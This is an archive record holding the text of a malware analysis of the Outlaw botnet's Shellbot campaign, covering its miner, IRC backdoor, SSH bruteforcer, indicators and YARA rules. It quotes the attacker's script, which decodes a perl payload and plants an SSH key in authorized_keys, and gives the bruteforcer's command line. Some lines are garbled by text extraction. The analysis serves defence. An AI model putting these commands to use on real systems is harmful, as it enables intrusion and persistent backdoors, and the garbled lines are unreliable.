{
    "id": "6f338a2c-cb0d-42d0-bf5e-2212f2b6b794",
    "created_at": "2023-01-12T15:02:21.339577Z",
    "updated_at": "2025-03-27T02:16:59.172379Z",
    "deleted_at": null,
    "sha1_hash": "efe97a5efccf338ae8c65b72e3b2e32d7ae5bd77",
    "title": "2020-04-28 - Outlaw is Back, a New Crypto-Botnet Targets European Organizations",
    "authors": "",
    "file_creation_date": "2022-05-28T17:38:57Z",
    "file_modification_date": "2022-05-28T17:38:57Z",
    "file_size": 1836934,
    "plain_text": "# Outlaw is Back, a New Crypto-Botnet Targets European Organizations\n\n**[yoroi.company/research/outlaw-is-back-a-new-crypto-botnet-targets-european-organizations/](https://yoroi.company/research/outlaw-is-back-a-new-crypto-botnet-targets-european-organizations/)**\n\n04/28/2020\n\n## Introduction\n\n\nApril 28, 2020\n\n\nDuring our daily monitoring activities, we intercepted a singular Linux malware trying to penetrate the network of some of our customers. The\nLinux malware is the well-known “Shellbot”, it is a crimetool belonging to the arsenal of a threat actor tracked as the “Outlaw Hacking Group.”\n\n[The Outlaw Hacking Group was first spotted by TrendMicro in 2018 when the cyber criminal crew targeted automotive and financial industries.](https://blog.trendmicro.com/trendlabs-security-intelligence/perl-based-shellbot-looks-to-target-organizations-via-cc/)\n[The Outlaw Botnet uses brute force and SSH exploit (exploit Shellshock Flaw and Drupalgeddon2 vulnerability) to achieve remote access to](https://securityaffairs.co/wordpress/71370/hacking/drupalgeddon2-drupal-flaws.html)\nthe target systems, including server and IoT devices.\n\nThe first version spotted by TrendMicro includes a DDoS script that could be used by botmaster to set-up DDoS for-hire service offered on the\ndark web.\n\nThe main component of this malware implant is a variant of “Shellbot”, a Monero miner bundled with a Perl-based backdoor, which includes an\nIRC-based bot and an SSH scanner. Shellbot is known since 2005 and even available on GitHub. Now, Shellbot has re-appeared in the threat\nlandscape in a recent campaign, targeting organizations worldwide with a new IRC server and new Monero pools, so we decided to deepen\nthe analysis.\n\n[Based on our findings, there are some similarities in both techniques and architectures with another cybercrime group, which appeared in the](https://bitsmash.wordpress.com/2013/01/11/kippo-log-8th-january-2013/)\nwild around 2012, most probably Romanian.\n\n## Technical Analysis\n\nAs previously mentioned, the infection chain starts with the hack of a Linux server, after a SSH brute-force attack as shown in Fig.1. The\nAccess Logs include requests coming from different source IP addresses with a delay of about 30 seconds from each other. Using this trick,\nthe bruteforce is able to bypass lockout login mechanisms such as Fail2Ban. Once the machine is fully compromised, the attacker will install a\ncomplete hacking suite, composed of an IRC bot, an SSH scanner, a bruteforce tool, and an XMRIG crypto-miner. All the malicious logic is\nopportunely managed by several bash or perl scripts.\n\nFigure 1: Shellbot Bruteforcing\n\nWhen the machine is completely infected, the installed files are the following:\n\nFigure 2: Directory listing\n\nThe parent folder is an hidden directory named “.rsync”, it includes three files and three sub-directories. The initial files are “init”, “init2” and\n“initall”. They are three bash scripts aimed at installing the three main components of the infection. The first component that is executed is\n“initall”, its body is the following:\n\nFigure 3: Content of the initall” file\n\n\n-----\n\ne sc pt o y as t o ac o u ct o s, t e st o e s used to c ea t e ct ac e o so e ot e ect o s o ot e p ocesses c\ncould generate some type of collision during the execution. Then, the row 36 shows that the file “init2” is printed on the standard output and\nthen executed.\n\nFigure 4: Content of the “init2” file\n\nFig. 4 shows the content of the init2 script. Also in this case, the script runs three files, “init0”, “a” from the folder “b”, “a” from the folder “c” after\ncleaning pending processes. Then prepares the settings of the persistence using the “crontab” linux utility. As shown in the configuration of the\njob, the malware prepares a different configuration of task scheduling according to the module and file to be executed:\n\n“/a/upd” file is run every 23 days (line 28);\n“/b/sync” every sunday at 08:05AM (line 29)\n“/b/sync” at the reboot (line 30)\n“/c/aptitude” every three days (line 31)\n\n### The “a” Folder\n\nThe first folder to analyze is “a”. This directory contains the crypto mining module named kswapd0. In this folder, the first one to be executed is\nthe file “a”. The script looks like the following:\n\nFigure 5: Content of the “a” file\n\nThe purpose of the script is to optimize the mining module by querying the information about the CPU through the reading of the “/proc/cpu”\nand when the manufacturer is retrieved the script provides to add some specific registry values depending by the vendor through the ModelSpecific Register utility “wrmsr”.\n\nThen that the “upd” script is executed. The upd script is quite simple, it checks if the process is alive, otherwise the script “run” is executed.\n\nFigure 6: Content of “upd” on the left and “run” on the right\n\nThe executed crypto miner is the file named “”kswapd0” based on the famous XMRIG monero crypto miner. Following the fingerprint:\n\nHash fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708\n\nThreat Cryptominer\n\n\nBrief\nDescription\n\n\nXMRIG Cryptominer and SSH backdoor\n\n\nSsdeep 49152:10cWKu0K8CpxlJWhabW/////////In6C1NdvKODyYGhiDC61N04EXBJDJw5qjURX:+d08xrbW/////////viu6T0lXBJDJwE2\n\nTable 1. Sample information\n\nThis component has two main functions:\n\n1. Install a cryptoMiner worker: The main purpose of this elf file is the instantiation of a crypto-mining worker. It is a fork of XMRIG project,\n\none of the most popular software to mine monero crypto values. This configuration works, as the original, with a configuration file written\nin json, named “config.json”. In the following figure is reported a piece of pseudocode responsible of the loading of the configuration file:\n\nFigure 7: Pseudocode of the loaded configuration file\n\nIn the following figure is reported the configuration file with all monero parameters:\n\nFigure 8: Piece of the configuration file with the evidences of user, pass and c2\n\n1. Install a SSH backdoor: the second component is a routine responsible to set a ssh backdoor through the installation of an ssh\n\nfingerprint inside the authorized ssh keys file:\n\nFigure 9: Authorized ssh key\n\n### The “b” Folder\n\nThe “b” folder contains the backdoor logic. It is composed only by three files: “a”, “run”, “stop”. They are three bash scripts, which we start to\nanalyze:\n\nFigure 10: Content of the “a” script file\n\nThe initial script is the file named “a”. It’s main purpose is to check the current working directory and save the file “dir.dir” in it, the next step is\nto launch the “stop” script to interrupt the execution of pending processes. In the end, it gives the execution permission and then execute the\n_run script:_\n\n\n-----\n\n#!/bin/shnohup ./stop>>/dev/null &sleep 5echo **ENCODED-BASE64-PAYLOAD | base64 --decode | perlcd ~ && rm -rf .ssh && mkdir .ssh && e**\nAAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/\nmdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh\n\nCode Snippet 1\n\nThe run script executes another perl script encoded in base64 format. Then, it retries to store the same ssh key seen in Figure 8. Now let’s\ndeep inside the perl script. After decoding the base64 wrapper, we obtain another level of obfuscation in perl leveraging the “pack()”\ninstruction, as shown in the following Figure:\n\nFigure 11: Piece of the packed script\n\nHowever it is very easy to decode obtaining the real malicious code:\n\nFigure 12: Piece of the ShellBot client\n\nIt is ShellBot malware, one of the most famous IRC bot for Linux. This ShellBot contains all the communication logic to communicate with the\nC2 with the IRC protocol. It is interesting to notice that the C2 45.9.148[.#99 uses an unusual port to manage the IRC protocol, the 443,\ncommonly associated with the HTTPS protocol. The channel is “#007” and the administrators' nicknames from which receive the commands\n“polly” and “molly”. We try to connect it in order to estimate the number of the victims, but unfortunately, the server does not seem to be active\nat the time of writing.\n\nThe IRC server is on the same subnet of the other C2s and all belong to “Nice IT Service Group” a provider from the Netherlands. The C2\ndeploys an “Unreal ircd” server (Fig. 13). It is funny to notice the string “warez.de” inside the demon banner. Warez.de is an historical and\nfamous deutsche community of gaming crackers and hackers.\n\nFigure 13: some information about IRC C2\n\n### The “c” Folder\n\nThen, the init2 script (in Figure 4), execute c/start, as shown in below Figure. The start scripts execute “run” renaming it as “aptitude” in order\nto go unnoticed among processes list.\n\nFigure 14: Content of “run” script file\n\nThe “run” script (shown in Fig. 14 ) performs a first check on CPU architecture and a second one on the number of processors. If the bot is\nrunning on a 64 bit system with less than seven processors the “go” script is executed. On line 17 another control is performed: if the system is\n32 bit without the check on the number of processors as in this case. It is not clear why the malware performs these kind of checks.\n\nFigure 15: Content of run script\n\nThe “go” script performs some preliminary operations before starting the “tsm” component as shown in Figure 16. The script checks the\narchitecture and, based on this, defines the number of threads. If it is running on arm architecture, the number of threads is set to 75 (as\nshown in line 9), otherwise the number of threads is set to 515 (as shown by line 5).\n\nFigure 16: Content of go script\n\n### The \"tsm\" Module: a Multistage SSH-Bruteforcer\n\nAt this point, the script starts the “tsm” module. This module is a sort of network scanner and bruteforcer named “Faster Than Lite” (Fig. 17).\nFTL doesn't seem to be an off-the-shelf tool. Probably is a tool sold on criminal dark forum rather then a custom tool made by this Criminal\nActor due to the existence of a help menu as shown in Fig. 17.\n\nFigure 17: “Faster Than Light” payload evidence\n\nThe “tsm” tool is then executed with the following parameters:\n\n**timeout 3h ./tsm -t $threads -f 1 -s 12 -S 10 -p 0 -d 1 p ip**\n\nLet's explain this configuration: timeout 3 h means that the script executes for 3 hours. -f 1 for A.B class /16 scan, -s 12 is the timeout\nbetween 2 requests, 12 seconds in this case, probably to overcome some login lock mechanisms. The -S 10 is the second timeout set to 10\nseconds, however is not clear the usage of the second timeout. The -p parameterdefines the port to connect to, setting this parameter to 0\nmeans “multiport”, as also stated by the help. The -d parameter is not present in the help menu, this is an indicator that this tool maybe is\nunder development and is not yet mature (due to the presence of debug information), but “works as expected”. The definition of p ip means to\nread “ip port\" file, namely the file which is downloaded by one of the two C2 with encrypted multiple SSH requests as shown by Fig. 18. This is\nthe “Stage 1”.\n\nFigure 18: SSH traffic from C2\n\nOnce downloaded the list of IPs then starts the “Stage 2” also named “Game Over”\n\n\n-----\n\nt s stage t e ecutes t e ss b ute o ce og c us g t e co ta ed t e p e ous y do oaded st t t e t e o t g, t e do oaded\nlist contains 94.541 different IP addresses belonging to different countries. We sort these unique IPs and after aggregate them by country we\nare able to plot them on a World Heat Map in order to show the real distribution. The result is Fig. 19.\n\nAs shown by the Heat Map, the most affected countries are the United States of America with 34998 IP, followed by 8688 from China, 6891\nfrom Germany, 4068 France. The distribution is homogeneous throughout the European continent, Italy has 658 unique IP.\n\nFigure 19: Distribution of unique IP addresses present in the downloaded list.\n\nWe find that the tsm component contains pscan and ssh-scan, respectively a port scanner and a bruteforcer used in past campaigns.\n[Searching for useful information, we found that it has appeared on several honeypots since 2012, the scripts are similar in styles and in](https://bitsmash.wordpress.com/tag/honeypot/)\n[techniques implemented. In one of this script there is an email “[email protected]” and some indicators that lead back to a romanian group.](https://yoroi.company/cdn-cgi/l/email-protection#d2bfb3b4bbb3eaeba6bf92abb3babdbdfcb1bdbf)\n\n## Conclusion\n\nThis Outlaw Botnet is still active and it is targeting organizations worldwide, this time with new monero pools and different C2. The Command\nand Control IRC server is down at the time of writing, but the two C2 which provide the victim IPs list are still active. This means that, most\nprobably, the gang will deploy a new IRC server leaving the rest of the infrastructure untouched. We suggest to harden and update your SSH\nserver configuring authentication with authorized keys and disabling passwords.\n\n## Indicators of Compromise\n\nHashes\n\nac2513b3d37de1e89547d12d4e05a899848847571a3b11b18db0075149e85dcc ./.rsync/c/lib/32/tsm\nb92e77fdc4aa3181ed62b2d0e58298f51f2993321580c8d2e3368ef8d6944364 ./.rsync/c/slow\nf95c1c076b2d78834cc62edd2f4c4f2f6bfa21d07d07853274805859e20261ba ./.rsync/c/watchdog\n99fa6e718f5f54b1c8bf14e7b73aa0cda6fe9793a958bd4e0a12916755c1ca93 ./.rsync/c/tsm64\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 ./.rsync/c/v\nd6c230344520dfc21770300bf8364031e10758d223e8281e2b447c3bf1c43d2b ./.rsync/c/tsm32\n5a1797ae845e8c80c771ece9174b93ad5d5a74e593fe3b508ba105830db5fd92 ./.rsync/c/run\n0bf8868d117a7c45276b6f966c09830b010c550cd16a2b0d753924fca707c842 ./.rsync/c/tsm\n9dbbc9b5d7793425968e42e995226c5f9fe32e502a0a694320a5e838d57c8836 ./.rsync/c/start\nf942240260f0281a3c0e909ac10da7f67f87fb8e2a195e2955510424e35a8c8b ./.rsync/c/stop\ne62be7212627d9375e7b7afd459644d3f8b4c71a370678eb7fa497b9850a02d5 ./.rsync/c/go\n1cc9c6a2c0f2f41900c345b0216023ed51d4e782ed61ed5e39eb423fb2f1ddd8 ./.rsync/c/golan\nb2469af4217d99b16a4b708aa29af0a60edeec3242078f42fa03b8eaf285d657 ./.rsync/b/run\ndc43fdfbb5f7e8ecc80353dcd85889c0c08483c99acbce35b3ed8f399c936920 ./.rsync/b/a\n1c42bfcfb910013ebe02adeb6127884de54ea225161d0a7347c05c2c4e6fbf49 ./.rsync/b/stop\nfd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708 ./.rsync/a/kswapd0\n18b77e655b323fa07dad9d7b64631dbaa428da7d347b9b9497276f4d466079fe ./.rsync/a/run\n9d4fef06b12d18385f1c45dd4e37f031c6590b080ea5446ff7a5bac491daea50 ./.rsync/a/a\n1c7b4c7ab716159b6dc9fc5abc6ae28ab9dfa0d64e3d860824692291a7038a4e ./.rsync/a/stop\ne38ff53f3978c84078b016006389eb3b286443d61cbabb7d5a4f003c8ae67421 ./.rsync/a/init0\nbefdf0be5b811621a72eddafad1886321102be1ec3417030888371c5554d9d1a ./.rsync/initall\n16d93464ebd8f370011bf040cb4aec7699f4be604452eb5efcd77e5d5e67ae1b ./.rsync/init\nC2\n\ndebian-package[.center\n45.9.148[.125\n45.9.148[.129\n45.9.148[.99\n\n### Yara Rules\n\n\n-----\n\n```\nmeta:\n   description = \"XMRIG Miner of the shellbot campaign\"\n   hash = \"fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708\"\n   author = \"Cybaze - Yoroi ZLab\"\n   last_updated = \"2020-04-27\"\n   tlp = \"white\"\n   category = \"informational\"\nstrings:\n     $s1 = { D3 EA FF 98 ?? ?? ?? ?? D3 EA FF }\n     $s2 = { 50 ?? EA FF 28 D3 }\n     $s3 = { 48 03 7D ?? 48 63 15 95 ?? ?? ?? 48 39 FE 76 ?? 48 8D 04 17 48 39 C6 }\ncondition:\n     all of them\n}\nimport \"elf\"\nrule TSM_FasterThanLite_Outlaw_Apr20 \n{\nmeta:\n   description = \"TSM ssh bruteforce component of Outlaw Botnet April 2020\"\n   hash32 = \"3eef8c27ad8458af84dcb52dfa01295c427908a0\" // for tsm32 (32 bit)\n   hash64 = \"a1da0566193f30061f69b057c698dc7923d2038c\" // for tsm64 (64 bit)\n   author = \"Cybaze - Yoroi ZLab\"\n   last_updated = \"2020-04-27\"\n   tlp = \"white\"\n   category = \"informational\"\n strings:\n     $s1= {63 73 2D 64 76 63 00 69 64 2D 73 6D 69 6D 65 2D\n61 6C 67 2D 45 53 44 48 77 69 74 68 33 44 45 53\n00 69 64 2D 73 6D 69 6D 65 2D 61 6C 67 2D 45 53\n44 48 77 69 74 68 52 43 32 00 69 64 2D 73 6D 69\n6D 65 2D 61 6C 67 2D 33 44 45 53 77 72 61 70 00\n69 64 2D 73 6D 69 6D 65 2D 61 6C 67 2D 52 43 32\n77 72 61 70 00 69 64 2D 73 6D 69 6D 65 2D 61 6C\n67 2D 45 53 44 48 00 69 64 2D 73 6D 69 6D 65 2D\n61 6C 67 2D 43 4D 53 33}\n     $s2= {2D 70 6C 61 63 65 4F 66 42 69 72 74 68 00 69 64\n2D 70 64 61 2D 67 65 6E 64 65 72 00 69 64 2D 70\n64 61 2D 63 6F 75 6E 74 72 79 4F 66 43 69 74 69\n7A 65 6E 73 68 69 70}\n     $s3 =\"brainpoolP384r1\" wide ascii\n     $s4= \"getpwnam\" wide ascii //mutex\n     $s5 = \"dup2\" wide ascii //mutex\n     $s6 = \"_ITM_deregisterTMCloneTable\" wide ascii //mutex\n     $elf = { 7f 45 4c 46 } //ELF file’s magic numbers\n    condition:\n        $elf in (0..4) and all of them and elf.number_of_sections > 25 \n}\n\n```\n_This blog post was authored by Luigi Martire, Antonio Pirozzi and Pierluigi Paganini_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-04-28 - Outlaw is Back, a New Crypto-Botnet Targets European Organizations.pdf"
    ],
    "report_names": [
        "2020-04-28 - Outlaw is Back, a New Crypto-Botnet Targets European Organizations.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535741,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1653759537,
    "ts_modification_date": 1653759537,
    "files": {
        "pdf": "https://archive.orkl.eu/efe97a5efccf338ae8c65b72e3b2e32d7ae5bd77.pdf",
        "text": "https://archive.orkl.eu/efe97a5efccf338ae8c65b72e3b2e32d7ae5bd77.txt",
        "img": "https://archive.orkl.eu/efe97a5efccf338ae8c65b72e3b2e32d7ae5bd77.jpg"
    }
}